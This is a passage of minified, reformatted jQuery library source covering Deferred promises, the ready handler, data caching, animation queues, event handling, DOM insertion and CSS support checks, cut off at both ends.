                                        e,
                                        s(o, n, c, i),
                                        s(o, n, u, i),
                                        s(o, n, c, n.notifyWith)
                                      ))
                                  : (r !== c && ((a = void 0), (l = [e])),
                                    (i || n.resolveWith)(a, l));
                            }
                          },
                          p = i
                            ? d
                            : function () {
                                try {
                                  d();
                                } catch (e) {
                                  de.Deferred.exceptionHook &&
                                    de.Deferred.exceptionHook(e, p.stackTrace),
                                    t + 1 >= o &&
                                      (r !== u && ((a = void 0), (l = [e])),
                                      n.rejectWith(a, l));
                                }
                              };
                        t
                          ? p()
                          : (de.Deferred.getStackHook &&
                              (p.stackTrace = de.Deferred.getStackHook()),
                            e.setTimeout(p));
                      };
                    }
                    return de
                      .Deferred(function (e) {
                        n[0][3].add(s(0, e, se(i) ? i : c, e.notifyWith)),
                          n[1][3].add(s(0, e, se(t) ? t : c)),
                          n[2][3].add(s(0, e, se(r) ? r : u));
                      })
                      .promise();
                  },
                  promise: function (e) {
                    return null != e ? de.extend(e, i) : i;
                  },
                },
                o = {};
              return (
                de.each(n, function (e, t) {
                  var s = t[2],
                    a = t[5];
                  (i[t[1]] = s.add),
                    a &&
                      s.add(
                        function () {
                          r = a;
                        },
                        n[3 - e][2].disable,
                        n[3 - e][3].disable,
                        n[0][2].lock,
                        n[0][3].lock
                      ),
                    s.add(t[3].fire),
                    (o[t[0]] = function () {
                      return (
                        o[t[0] + "With"](this === o ? void 0 : this, arguments),
                        this
                      );
                    }),
                    (o[t[0] + "With"] = s.fireWith);
                }),
                i.promise(o),
                t && t.call(o, o),
                o
              );
            },
            when: function (e) {
              var t = arguments.length,
                n = t,
                r = Array(n),
                i = V.call(arguments),
                o = de.Deferred(),
                s = function (e) {
                  return function (n) {
                    (r[e] = this),
                      (i[e] = arguments.length > 1 ? V.call(arguments) : n),
                      --t || o.resolveWith(r, i);
                  };
                };
              if (
                t <= 1 &&
                (d(e, o.done(s(n)).resolve, o.reject, !t),
                "pending" === o.state() || se(i[n] && i[n].then))
              )
                return o.then();
              for (; n--; ) d(i[n], s(n), o.reject);
              return o.promise();
            },
          });
        var _e = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
        (de.Deferred.exceptionHook = function (t, n) {
          e.console &&
            e.console.warn &&
            t &&
            _e.test(t.name) &&
            e.console.warn(
              "jQuery.Deferred exception: " + t.message,
              t.stack,
              n
            );
        }),
          (de.readyException = function (t) {
            e.setTimeout(function () {
              throw t;
            });
          });
        var Te = de.Deferred();
        function Ae() {
          le.removeEventListener("DOMContentLoaded", Ae),
            e.removeEventListener("load", Ae),
            de.ready();
        }
        (de.fn.ready = function (e) {
          return (
            Te.then(e).catch(function (e) {
              de.readyException(e);
            }),
            this
          );
        }),
          de.extend({
            isReady: !1,
            readyWait: 1,
            ready: function (e) {
              (!0 === e ? --de.readyWait : de.isReady) ||
                ((de.isReady = !0),
                (!0 !== e && --de.readyWait > 0) || Te.resolveWith(le, [de]));
            },
          }),
          (de.ready.then = Te.then),
          "complete" === le.readyState ||
          ("loading" !== le.readyState && !le.documentElement.doScroll)
            ? e.setTimeout(de.ready)
            : (le.addEventListener("DOMContentLoaded", Ae),
              e.addEventListener("load", Ae));
        var Ce = function (e, t, n, r, o, s, a) {
            var l = 0,
              c = e.length,
              u = null == n;
            if ("object" === i(n))
              for (l in ((o = !0), n)) Ce(e, t, l, n[l], !0, s, a);
            else if (
              void 0 !== r &&
              ((o = !0),
              se(r) || (a = !0),
              u &&
                (a
                  ? (t.call(e, r), (t = null))
                  : ((u = t),
                    (t = function (e, t, n) {
                      return u.call(de(e), n);
                    }))),
              t)
            )
              for (; l < c; l++)
                t(e[l], n, a ? r : r.call(e[l], l, t(e[l], n)));
            return o ? e : u ? t.call(e) : c ? t(e[0], n) : s;
          },
          $e = /^-ms-/,
          Se = /-([a-z])/g,
          Ee = function (e) {
            return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType;
          };
        function De() {
          this.expando = de.expando + De.uid++;
        }
        (De.uid = 1),
          (De.prototype = {
            cache: function (e) {
              var t = e[this.expando];
              return (
                t ||
                  ((t = {}),
                  Ee(e) &&
                    (e.nodeType
                      ? (e[this.expando] = t)
                      : Object.defineProperty(e, this.expando, {
                          value: t,
                          configurable: !0,
                        }))),
                t
              );
            },
            set: function (e, t, n) {
              var r,
                i = this.cache(e);
              if ("string" == typeof t) i[f(t)] = n;
              else for (r in t) i[f(r)] = t[r];
              return i;
            },
            get: function (e, t) {
              return void 0 === t
                ? this.cache(e)
                : e[this.expando] && e[this.expando][f(t)];
            },
            access: function (e, t, n) {
              return void 0 === t || (t && "string" == typeof t && void 0 === n)
                ? this.get(e, t)
                : (this.set(e, t, n), void 0 !== n ? n : t);
            },
            remove: function (e, t) {
              var n,
                r = e[this.expando];
              if (void 0 !== r) {
                if (void 0 !== t) {
                  n = (t = Array.isArray(t)
                    ? t.map(f)
                    : (t = f(t)) in r
                    ? [t]
                    : t.match(we) || []).length;
                  for (; n--; ) delete r[t[n]];
                }
                (void 0 === t || de.isEmptyObject(r)) &&
                  (e.nodeType
                    ? (e[this.expando] = void 0)
                    : delete e[this.expando]);
              }
            },
            hasData: function (e) {
              var t = e[this.expando];
              return void 0 !== t && !de.isEmptyObject(t);
            },
          });
        var ke = new De(),
          Le = new De(),
          je = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
          Oe = /[A-Z]/g;
        de.extend({
          hasData: function (e) {
            return Le.hasData(e) || ke.hasData(e);
          },
          data: function (e, t, n) {
            return Le.access(e, t, n);
          },
          removeData: function (e, t) {
            Le.remove(e, t);
          },
          _data: function (e, t, n) {
            return ke.access(e, t, n);
          },
          _removeData: function (e, t) {
            ke.remove(e, t);
          },
        }),
          de.fn.extend({
            data: function (e, t) {
              var n,
                r,
                i,
                o = this[0],
                s = o && o.attributes;
              if (void 0 === e) {
                if (
                  this.length &&
                  ((i = Le.get(o)),
                  1 === o.nodeType && !ke.get(o, "hasDataAttrs"))
                ) {
                  for (n = s.length; n--; )
                    s[n] &&
                      0 === (r = s[n].name).indexOf("data-") &&
                      ((r = f(r.slice(5))), h(o, r, i[r]));
                  ke.set(o, "hasDataAttrs", !0);
                }
                return i;
              }
              return "object" == typeof e
                ? this.each(function () {
                    Le.set(this, e);
                  })
                : Ce(
                    this,
                    function (t) {
                      var n;
                      if (o && void 0 === t)
                        return void 0 !== (n = Le.get(o, e)) ||
                          void 0 !== (n = h(o, e))
                          ? n
                          : void 0;
                      this.each(function () {
                        Le.set(this, e, t);
                      });
                    },
                    null,
                    t,
                    arguments.length > 1,
                    null,
                    !0
                  );
            },
            removeData: function (e) {
              return this.each(function () {
                Le.remove(this, e);
              });
            },
          }),
          de.extend({
            queue: function (e, t, n) {
              var r;
              if (e)
                return (
                  (t = (t || "fx") + "queue"),
                  (r = ke.get(e, t)),
                  n &&
                    (!r || Array.isArray(n)
                      ? (r = ke.access(e, t, de.makeArray(n)))
                      : r.push(n)),
                  r || []
                );
            },
            dequeue: function (e, t) {
              t = t || "fx";
              var n = de.queue(e, t),
                r = n.length,
                i = n.shift(),
                o = de._queueHooks(e, t);
              "inprogress" === i && ((i = n.shift()), r--),
                i &&
                  ("fx" === t && n.unshift("inprogress"),
                  delete o.stop,
                  i.call(
                    e,
                    function () {
                      de.dequeue(e, t);
                    },
                    o
                  )),
                !r && o && o.empty.fire();
            },
            _queueHooks: function (e, t) {
              var n = t + "queueHooks";
              return (
                ke.get(e, n) ||
                ke.access(e, n, {
                  empty: de.Callbacks("once memory").add(function () {
                    ke.remove(e, [t + "queue", n]);
                  }),
                })
              );
            },
          }),
          de.fn.extend({
            queue: function (e, t) {
              var n = 2;
              return (
                "string" != typeof e && ((t = e), (e = "fx"), n--),
                arguments.length < n
                  ? de.queue(this[0], e)
                  : void 0 === t
                  ? this
                  : this.each(function () {
                      var n = de.queue(this, e, t);
                      de._queueHooks(this, e),
                        "fx" === e &&
                          "inprogress" !== n[0] &&
                          de.dequeue(this, e);
                    })
              );
            },
            dequeue: function (e) {
              return this.each(function () {
                de.dequeue(this, e);
              });
            },
            clearQueue: function (e) {
              return this.queue(e || "fx", []);
            },
            promise: function (e, t) {
              var n,
                r = 1,
                i = de.Deferred(),
                o = this,
                s = this.length,
                a = function () {
                  --r || i.resolveWith(o, [o]);
                };
              for (
                "string" != typeof e && ((t = e), (e = void 0)), e = e || "fx";
                s--;

              )
                (n = ke.get(o[s], e + "queueHooks")) &&
                  n.empty &&
                  (r++, n.empty.add(a));
              return a(), i.promise(t);
            },
          });
        var qe = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
          Ne = new RegExp("^(?:([+-])=|)(" + qe + ")([a-z%]*)$", "i"),
          He = ["Top", "Right", "Bottom", "Left"],
          Pe = le.documentElement,
          Ie = function (e) {
            return de.contains(e.ownerDocument, e);
          },
          Re = { composed: !0 };
        Pe.getRootNode &&
          (Ie = function (e) {
            return (
              de.contains(e.ownerDocument, e) ||
              e.getRootNode(Re) === e.ownerDocument
            );
          });
        var Me = function (e, t) {
            return (
              "none" === (e = t || e).style.display ||
              ("" === e.style.display &&
                Ie(e) &&
                "none" === de.css(e, "display"))
            );
          },
          Ue = {};
        de.fn.extend({
          show: function () {
            return v(this, !0);
          },
          hide: function () {
            return v(this);
          },
          toggle: function (e) {
            return "boolean" == typeof e
              ? e
                ? this.show()
                : this.hide()
              : this.each(function () {
                  Me(this) ? de(this).show() : de(this).hide();
                });
          },
        });
        var Fe,
          We,
          ze = /^(?:checkbox|radio)$/i,
          Be = /<([a-z][^\/\0>\x20\t\r\n\f]*)/i,
          Ge = /^$|^module$|\/(?:java|ecma)script/i;
        (Fe = le.createDocumentFragment().appendChild(le.createElement("div"))),
          (We = le.createElement("input")).setAttribute("type", "radio"),
          We.setAttribute("checked", "checked"),
          We.setAttribute("name", "t"),
          Fe.appendChild(We),
          (oe.checkClone = Fe.cloneNode(!0).cloneNode(!0).lastChild.checked),
          (Fe.innerHTML = "<textarea>x</textarea>"),
          (oe.noCloneChecked = !!Fe.cloneNode(!0).lastChild.defaultValue),
          (Fe.innerHTML = "<option></option>"),
          (oe.option = !!Fe.lastChild);
        var Ye = {
          thead: [1, "<table>", "</table>"],
          col: [2, "<table><colgroup>", "</colgroup></table>"],
          tr: [2, "<table><tbody>", "</tbody></table>"],
          td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
          _default: [0, "", ""],
        };
        (Ye.tbody = Ye.tfoot = Ye.colgroup = Ye.caption = Ye.thead),
          (Ye.th = Ye.td),
          oe.option ||
            (Ye.optgroup = Ye.option =
              [1, "<select multiple='multiple'>", "</select>"]);
        var Ke = /<|&#?\w+;/,
          Xe = /^([^.]*)(?:\.(.+)|)/;
        function Ve(e, t, n, r, i, o) {
          var s, a;
          if ("object" == typeof t) {
            for (a in ("string" != typeof n && ((r = r || n), (n = void 0)), t))
              Ve(e, a, n, r, t[a], o);
            return e;
          }
          if (
            (null == r && null == i
              ? ((i = n), (r = n = void 0))
              : null == i &&
                ("string" == typeof n
                  ? ((i = r), (r = void 0))
                  : ((i = r), (r = n), (n = void 0))),
            !1 === i)
          )
            i = _;
          else if (!i) return e;
          return (
            1 === o &&
              ((s = i),
              (i = function (e) {
                return de().off(e), s.apply(this, arguments);
              }),
              (i.guid = s.guid || (s.guid = de.guid++))),
            e.each(function () {
              de.event.add(this, t, i, r, n);
            })
          );
        }
        (de.event = {
          global: {},
          add: function (e, t, n, r, i) {
            var o,
              s,
              a,
              l,
              c,
              u,
              d,
              p,
              f,
              h,
              g,
              m = ke.get(e);
            if (Ee(e))
              for (
                n.handler && ((n = (o = n).handler), (i = o.selector)),
                  i && de.find.matchesSelector(Pe, i),
                  n.guid || (n.guid = de.guid++),
                  (l = m.events) || (l = m.events = Object.create(null)),
                  (s = m.handle) ||
                    (s = m.handle =
                      function (t) {
                        return void 0 !== de && de.event.triggered !== t.type
                          ? de.event.dispatch.apply(e, arguments)
                          : void 0;
                      }),
                  c = (t = (t || "").match(we) || [""]).length;
                c--;

              )
                (f = g = (a = Xe.exec(t[c]) || [])[1]),
                  (h = (a[2] || "").split(".").sort()),
                  f &&
                    ((d = de.event.special[f] || {}),
                    (f = (i ? d.delegateType : d.bindType) || f),
                    (d = de.event.special[f] || {}),
                    (u = de.extend(
                      {
                        type: f,
                        origType: g,
                        data: r,
                        handler: n,
                        guid: n.guid,
                        selector: i,
                        needsContext: i && de.expr.match.needsContext.test(i),
                        namespace: h.join("."),
                      },
                      o
                    )),
                    (p = l[f]) ||
                      (((p = l[f] = []).delegateCount = 0),
                      (d.setup && !1 !== d.setup.call(e, r, h, s)) ||
                        (e.addEventListener && e.addEventListener(f, s))),
                    d.add &&
                      (d.add.call(e, u),
                      u.handler.guid || (u.handler.guid = n.guid)),
                    i ? p.splice(p.delegateCount++, 0, u) : p.push(u),
                    (de.event.global[f] = !0));
          },
          remove: function (e, t, n, r, i) {
            var o,
              s,
              a,
              l,
              c,
              u,
              d,
              p,
              f,
              h,
              g,
              m = ke.hasData(e) && ke.get(e);
            if (m && (l = m.events)) {
              for (c = (t = (t || "").match(we) || [""]).length; c--; )
                if (
                  ((f = g = (a = Xe.exec(t[c]) || [])[1]),
                  (h = (a[2] || "").split(".").sort()),
                  f)
                ) {
                  for (
                    d = de.event.special[f] || {},
                      p = l[(f = (r ? d.delegateType : d.bindType) || f)] || [],
                      a =
                        a[2] &&
                        new RegExp(
                          "(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)"
                        ),
                      s = o = p.length;
                    o--;

                  )
                    (u = p[o]),
                      (!i && g !== u.origType) ||
                        (n && n.guid !== u.guid) ||
                        (a && !a.test(u.namespace)) ||
                        (r &&
                          r !== u.selector &&
                          ("**" !== r || !u.selector)) ||
                        (p.splice(o, 1),
                        u.selector && p.delegateCount--,
                        d.remove && d.remove.call(e, u));
                  s &&
                    !p.length &&
                    ((d.teardown && !1 !== d.teardown.call(e, h, m.handle)) ||
                      de.removeEvent(e, f, m.handle),
                    delete l[f]);
                } else for (f in l) de.event.remove(e, f + t[c], n, r, !0);
              de.isEmptyObject(l) && ke.remove(e, "handle events");
            }
          },
          dispatch: function (e) {
            var t,
              n,
              r,
              i,
              o,
              s,
              a = new Array(arguments.length),
              l = de.event.fix(e),
              c = (ke.get(this, "events") || Object.create(null))[l.type] || [],
              u = de.event.special[l.type] || {};
            for (a[0] = l, t = 1; t < arguments.length; t++)
              a[t] = arguments[t];
            if (
              ((l.delegateTarget = this),
              !u.preDispatch || !1 !== u.preDispatch.call(this, l))
            ) {
              for (
                s = de.event.handlers.call(this, l, c), t = 0;
                (i = s[t++]) && !l.isPropagationStopped();

              )
                for (
                  l.currentTarget = i.elem, n = 0;
                  (o = i.handlers[n++]) && !l.isImmediatePropagationStopped();

                )
                  (l.rnamespace &&
                    !1 !== o.namespace &&
                    !l.rnamespace.test(o.namespace)) ||
                    ((l.handleObj = o),
                    (l.data = o.data),
                    void 0 !==
                      (r = (
                        (de.event.special[o.origType] || {}).handle || o.handler
                      ).apply(i.elem, a)) &&
                      !1 === (l.result = r) &&
                      (l.preventDefault(), l.stopPropagation()));
              return u.postDispatch && u.postDispatch.call(this, l), l.result;
            }
          },
          handlers: function (e, t) {
            var n,
              r,
              i,
              o,
              s,
              a = [],
              l = t.delegateCount,
              c = e.target;
            if (l && c.nodeType && !("click" === e.type && e.button >= 1))
              for (; c !== this; c = c.parentNode || this)
                if (
                  1 === c.nodeType &&
                  ("click" !== e.type || !0 !== c.disabled)
                ) {
                  for (o = [], s = {}, n = 0; n < l; n++)
                    void 0 === s[(i = (r = t[n]).selector + " ")] &&
                      (s[i] = r.needsContext
                        ? de(i, this).index(c) > -1
                        : de.find(i, this, null, [c]).length),
                      s[i] && o.push(r);
                  o.length && a.push({ elem: c, handlers: o });
                }
            return (
              (c = this),
              l < t.length && a.push({ elem: c, handlers: t.slice(l) }),
              a
            );
          },
          addProp: function (e, t) {
            Object.defineProperty(de.Event.prototype, e, {
              enumerable: !0,
              configurable: !0,
              get: se(t)
                ? function () {
                    if (this.originalEvent) return t(this.originalEvent);
                  }
                : function () {
                    if (this.originalEvent) return this.originalEvent[e];
                  },
              set: function (t) {
                Object.defineProperty(this, e, {
                  enumerable: !0,
                  configurable: !0,
                  writable: !0,
                  value: t,
                });
              },
            });
          },
          fix: function (e) {
            return e[de.expando] ? e : new de.Event(e);
          },
          special: {
            load: { noBubble: !0 },
            click: {
              setup: function (e) {
                var t = this || e;
                return (
                  ze.test(t.type) &&
                    t.click &&
                    s(t, "input") &&
                    C(t, "click", w),
                  !1
                );
              },
              trigger: function (e) {
                var t = this || e;
                return (
                  ze.test(t.type) && t.click && s(t, "input") && C(t, "click"),
                  !0
                );
              },
              _default: function (e) {
                var t = e.target;
                return (
                  (ze.test(t.type) &&
                    t.click &&
                    s(t, "input") &&
                    ke.get(t, "click")) ||
                  s(t, "a")
                );
              },
            },
            beforeunload: {
              postDispatch: function (e) {
                void 0 !== e.result &&
                  e.originalEvent &&
                  (e.originalEvent.returnValue = e.result);
              },
            },
          },
        }),
          (de.removeEvent = function (e, t, n) {
            e.removeEventListener && e.removeEventListener(t, n);
          }),
          (de.Event = function (e, t) {
            if (!(this instanceof de.Event)) return new de.Event(e, t);
            e && e.type
              ? ((this.originalEvent = e),
                (this.type = e.type),
                (this.isDefaultPrevented =
                  e.defaultPrevented ||
                  (void 0 === e.defaultPrevented && !1 === e.returnValue)
                    ? w
                    : _),
                (this.target =
                  e.target && 3 === e.target.nodeType
                    ? e.target.parentNode
                    : e.target),
                (this.currentTarget = e.currentTarget),
                (this.relatedTarget = e.relatedTarget))
              : (this.type = e),
              t && de.extend(this, t),
              (this.timeStamp = (e && e.timeStamp) || Date.now()),
              (this[de.expando] = !0);
          }),
          (de.Event.prototype = {
            constructor: de.Event,
            isDefaultPrevented: _,
            isPropagationStopped: _,
            isImmediatePropagationStopped: _,
            isSimulated: !1,
            preventDefault: function () {
              var e = this.originalEvent;
              (this.isDefaultPrevented = w),
                e && !this.isSimulated && e.preventDefault();
            },
            stopPropagation: function () {
              var e = this.originalEvent;
              (this.isPropagationStopped = w),
                e && !this.isSimulated && e.stopPropagation();
            },
            stopImmediatePropagation: function () {
              var e = this.originalEvent;
              (this.isImmediatePropagationStopped = w),
                e && !this.isSimulated && e.stopImmediatePropagation(),
                this.stopPropagation();
            },
          }),
          de.each(
            {
              altKey: !0,
              bubbles: !0,
              cancelable: !0,
              changedTouches: !0,
              ctrlKey: !0,
              detail: !0,
              eventPhase: !0,
              metaKey: !0,
              pageX: !0,
              pageY: !0,
              shiftKey: !0,
              view: !0,
              char: !0,
              code: !0,
              charCode: !0,
              key: !0,
              keyCode: !0,
              button: !0,
              buttons: !0,
              clientX: !0,
              clientY: !0,
              offsetX: !0,
              offsetY: !0,
              pointerId: !0,
              pointerType: !0,
              screenX: !0,
              screenY: !0,
              targetTouches: !0,
              toElement: !0,
              touches: !0,
              which: !0,
            },
            de.event.addProp
          ),
          de.each({ focus: "focusin", blur: "focusout" }, function (e, t) {
            de.event.special[e] = {
              setup: function () {
                return C(this, e, T), !1;
              },
              trigger: function () {
                return C(this, e), !0;
              },
              _default: function (t) {
                return ke.get(t.target, e);
              },
              delegateType: t,
            };
          }),
          de.each(
            {
              mouseenter: "mouseover",
              mouseleave: "mouseout",
              pointerenter: "pointerover",
              pointerleave: "pointerout",
            },
            function (e, t) {
              de.event.special[e] = {
                delegateType: t,
                bindType: t,
                handle: function (e) {
                  var n,
                    r = e.relatedTarget,
                    i = e.handleObj;
                  return (
                    (r && (r === this || de.contains(this, r))) ||
                      ((e.type = i.origType),
                      (n = i.handler.apply(this, arguments)),
                      (e.type = t)),
                    n
                  );
                },
              };
            }
          ),
          de.fn.extend({
            on: function (e, t, n, r) {
              return Ve(this, e, t, n, r);
            },
            one: function (e, t, n, r) {
              return Ve(this, e, t, n, r, 1);
            },
            off: function (e, t, n) {
              var r, i;
              if (e && e.preventDefault && e.handleObj)
                return (
                  (r = e.handleObj),
                  de(e.delegateTarget).off(
                    r.namespace ? r.origType + "." + r.namespace : r.origType,
                    r.selector,
                    r.handler
                  ),
                  this
                );
              if ("object" == typeof e) {
                for (i in e) this.off(i, t, e[i]);
                return this;
              }
              return (
                (!1 !== t && "function" != typeof t) || ((n = t), (t = void 0)),
                !1 === n && (n = _),
                this.each(function () {
                  de.event.remove(this, e, n, t);
                })
              );
            },
          });
        var Qe = /<script|<style|<link/i,
          Ze = /checked\s*(?:[^=]|=\s*.checked.)/i,
          Je = /^\s*<!\[CDATA\[|\]\]>\s*$/g;
        function et(e, t, n, i) {
          t = Q(t);
          var o,
            s,
            a,
            l,
            c,
            u,
            d = 0,
            p = e.length,
            f = p - 1,
            h = t[0],
            g = se(h);
          if (
            g ||
            (p > 1 && "string" == typeof h && !oe.checkClone && Ze.test(h))
          )
            return e.each(function (r) {
              var o = e.eq(r);
              g && (t[0] = h.call(this, r, o.html())), et(o, t, n, i);
            });
          if (
            p &&
            ((s = (o = x(t, e[0].ownerDocument, !1, e, i)).firstChild),
            1 === o.childNodes.length && (o = s),
            s || i)
          ) {
            for (l = (a = de.map(y(o, "script"), S)).length; d < p; d++)
              (c = o),
                d !== f &&
                  ((c = de.clone(c, !0, !0)), l && de.merge(a, y(c, "script"))),
                n.call(e[d], c, d);
            if (l)
              for (
                u = a[a.length - 1].ownerDocument, de.map(a, E), d = 0;
                d < l;
                d++
              )
                (c = a[d]),
                  Ge.test(c.type || "") &&
                    !ke.access(c, "globalEval") &&
                    de.contains(u, c) &&
                    (c.src && "module" !== (c.type || "").toLowerCase()
                      ? de._evalUrl &&
                        !c.noModule &&
                        de._evalUrl(
                          c.src,
                          { nonce: c.nonce || c.getAttribute("nonce") },
                          u
                        )
                      : r(c.textContent.replace(Je, ""), c, u));
          }
          return e;
        }
        de.extend({
          htmlPrefilter: function (e) {
            return e;
          },
          clone: function (e, t, n) {
            var r,
              i,
              o,
              s,
              a = e.cloneNode(!0),
              l = Ie(e);
            if (
              !(
                oe.noCloneChecked ||
                (1 !== e.nodeType && 11 !== e.nodeType) ||
                de.isXMLDoc(e)
              )
            )
              for (s = y(a), r = 0, i = (o = y(e)).length; r < i; r++)
                k(o[r], s[r]);
            if (t)
              if (n)
                for (
                  o = o || y(e), s = s || y(a), r = 0, i = o.length;
                  r < i;
                  r++
                )
                  D(o[r], s[r]);
              else D(e, a);
            return (
              (s = y(a, "script")).length > 0 && b(s, !l && y(e, "script")), a
            );
          },
          cleanData: function (e) {
            for (
              var t, n, r, i = de.event.special, o = 0;
              void 0 !== (n = e[o]);
              o++
            )
              if (Ee(n)) {
                if ((t = n[ke.expando])) {
                  if (t.events)
                    for (r in t.events)
                      i[r]
                        ? de.event.remove(n, r)
                        : de.removeEvent(n, r, t.handle);
                  n[ke.expando] = void 0;
                }
                n[Le.expando] && (n[Le.expando] = void 0);
              }
          },
        }),
          de.fn.extend({
            detach: function (e) {
              return L(this, e, !0);
            },
            remove: function (e) {
              return L(this, e);
            },
            text: function (e) {
              return Ce(
                this,
                function (e) {
                  return void 0 === e
                    ? de.text(this)
                    : this.empty().each(function () {
                        (1 !== this.nodeType &&
                          11 !== this.nodeType &&
                          9 !== this.nodeType) ||
                          (this.textContent = e);
                      });
                },
                null,
                e,
                arguments.length
              );
            },
            append: function () {
              return et(this, arguments, function (e) {
                (1 !== this.nodeType &&
                  11 !== this.nodeType &&
                  9 !== this.nodeType) ||
                  $(this, e).appendChild(e);
              });
            },
            prepend: function () {
              return et(this, arguments, function (e) {
                if (
                  1 === this.nodeType ||
                  11 === this.nodeType ||
                  9 === this.nodeType
                ) {
                  var t = $(this, e);
                  t.insertBefore(e, t.firstChild);
                }
              });
            },
            before: function () {
              return et(this, arguments, function (e) {
                this.parentNode && this.parentNode.insertBefore(e, this);
              });
            },
            after: function () {
              return et(this, arguments, function (e) {
                this.parentNode &&
                  this.parentNode.insertBefore(e, this.nextSibling);
              });
            },
            empty: function () {
              for (var e, t = 0; null != (e = this[t]); t++)
                1 === e.nodeType &&
                  (de.cleanData(y(e, !1)), (e.textContent = ""));
              return this;
            },
            clone: function (e, t) {
              return (
                (e = null != e && e),
                (t = null == t ? e : t),
                this.map(function () {
                  return de.clone(this, e, t);
                })
              );
            },
            html: function (e) {
              return Ce(
                this,
                function (e) {
                  var t = this[0] || {},
                    n = 0,
                    r = this.length;
                  if (void 0 === e && 1 === t.nodeType) return t.innerHTML;
                  if (
                    "string" == typeof e &&
                    !Qe.test(e) &&
                    !Ye[(Be.exec(e) || ["", ""])[1].toLowerCase()]
                  ) {
                    e = de.htmlPrefilter(e);
                    try {
                      for (; n < r; n++)
                        1 === (t = this[n] || {}).nodeType &&
                          (de.cleanData(y(t, !1)), (t.innerHTML = e));
                      t = 0;
                    } catch (e) {}
                  }
                  t && this.empty().append(e);
                },
                null,
                e,
                arguments.length
              );
            },
            replaceWith: function () {
              var e = [];
              return et(
                this,
                arguments,
                function (t) {
                  var n = this.parentNode;
                  de.inArray(this, e) < 0 &&
                    (de.cleanData(y(this)), n && n.replaceChild(t, this));
                },
                e
              );
            },
          }),
          de.each(
            {
              appendTo: "append",
              prependTo: "prepend",
              insertBefore: "before",
              insertAfter: "after",
              replaceAll: "replaceWith",
            },
            function (e, t) {
              de.fn[e] = function (e) {
                for (
                  var n, r = [], i = de(e), o = i.length - 1, s = 0;
                  s <= o;
                  s++
                )
                  (n = s === o ? this : this.clone(!0)),
                    de(i[s])[t](n),
                    Z.apply(r, n.get());
                return this.pushStack(r);
              };
            }
          );
        var tt = new RegExp("^(" + qe + ")(?!px)[a-z%]+$", "i"),
          nt = /^--/,
          rt = function (t) {
            var n = t.ownerDocument.defaultView;
            return (n && n.opener) || (n = e), n.getComputedStyle(t);
          },
          it = function (e, t, n) {
            var r,
              i,
              o = {};
            for (i in t) (o[i] = e.style[i]), (e.style[i] = t[i]);
            for (i in ((r = n.call(e)), t)) e.style[i] = o[i];
            return r;
          },
          ot = new RegExp(He.join("|"), "i"),
          st = "[\\x20\\t\\r\\n\\f]",
          at = new RegExp(
            "^" + st + "+|((?:^|[^\\\\])(?:\\\\.)*)" + st + "+$",
            "g"
          );
        !(function () {
          var t,
            n,
            r,
            i,
            o,
            s,
            a = function () {
              if (u) {
                (c.style.cssText =
                  "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0"),
                  (u.style.cssText =
                    "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%"),
                  Pe.appendChild(c).appendChild(u);
                var o = e.getComputedStyle(u);
                (t = "1%" !== o.top),
                  (s = 12 === l(o.marginLeft)),
                  (u.style.right = "60%"),
                  (i = 36 === l(o.right)),
                  (n = 36 === l(o.width)),
                  (u.style.position = "absolute"),
                  (r = 12 === l(u.offsetWidth / 3)),
                  Pe.removeChild(c),
                  (u = null);
              }
            },
            l = function (e) {
              return Math.round(parseFloat(e));
            },
            c = le.createElement("div"),
            u = le.createElement("div");
          u.style &&
            ((u.style.backgroundClip = "content-box"),
            (u.cloneNode(!0).style.backgroundClip = ""),
            (oe.clearCloneStyle = "content-box" === u.style.backgroundClip),
            de.extend(oe, {
              boxSizingReliable: function () {
                return a(), n;
              },
              pixelBoxStyles: function () {
                return a(), i;
              },
              pixelPosition: function () {
                return a(), t;
              },
              reliableMarginLeft: function () {
                return a(), s;
              },
              scrollboxSize: function () {
                return a(), r;
              },
              reliableTrDimensions: function () {
                var t, n, r, i;
                return (
                  null == o &&
                    ((t = le.createElement("table")),
                    (n = le.createElement("tr")),
                    (r = le.createElement("div")),
                    (t.style.cssText =
                      "position:absolute;left:-11111px;border-collapse:separate"),
                    (n.style.cssText = "border:1px solid"),
                    (n.style.height = "1px"),
                    (r.style.height = "9px"),
                    (r.style.display = "block"),
                    Pe.appendChild(t).appendChild(n).appendChild(r),
                    (i = e.getComputedStyle(n)),
                    (o =
                      parseInt(i.height, 10) +
                        parseInt(i.borderTopWidth, 10) +
                        parseInt(i.borderBottomWidth, 10) ===
                      n.offsetHeight),
                    Pe.removeChild(t)),
                  o
                );
              },
            }));
        })();
        var lt = ["Webkit", "Moz", "ms"],
          ct = le.createElement("div").style,
          ut = {},
          dt = /^(none|table(?!-c[ea]).+)/,
          pt = { position: "absolute", visibility: "hidden", display: "block" },
          ft = { letterSpacing: "0", fontWeight: "400" };
        function ht(e, t, n, r, i) {
          return new ht.prototype.init(e, t, n, r, i);
        }
        de.extend({
          cssHooks: {
            opacity: {
              get: function (e, t) {
                if (t) {
                  var n = j(e, "opacity");
                  return "" === n ? "1" : n;
                }
              },
            },
          },
          cssNumber: {
            animationIterationCount: !0,
            columnCount: !0,
            fillOpacity: !0,
            flexGrow: !0,
            flexShrink: !0,
            fontWeight: !0,
            gridArea: !0,
            gridColumn: !0,
            gridColumnEnd: !0,
            gridColumnStart: !0,
            gridRow: !0,
            gridRowEnd: !0,
            gridRowStart: !0,
            lineHeight: !0,
            opacity: !0,
            order: !0,
            orphans: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0,
          },
          cssProps: {},
          style: function (e, t, r, i) {
            if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
              var o,
                s,
                a,
                l = f(t),
                c = nt.test(t),
                u = e.style;
              if (
                (c || (t = q(l)),
                (a = de.cssHooks[t] || de.cssHooks[l]),
                void 0 === r)
              )
                return a && "get" in a && void 0 !== (o = a.get(e, !1, i))
                  ? o
                  : u[t];
              "string" ===
                (s = void 0 === r ? "undefined" : (0, n.default)(r)) &&
                (o = Ne.exec(r)) &&
                o[1] &&
                ((r = g(e, t, o)), (s = "number")),
                null != r &&
                  r == r &&
                  ("number" !== s ||
                    c ||
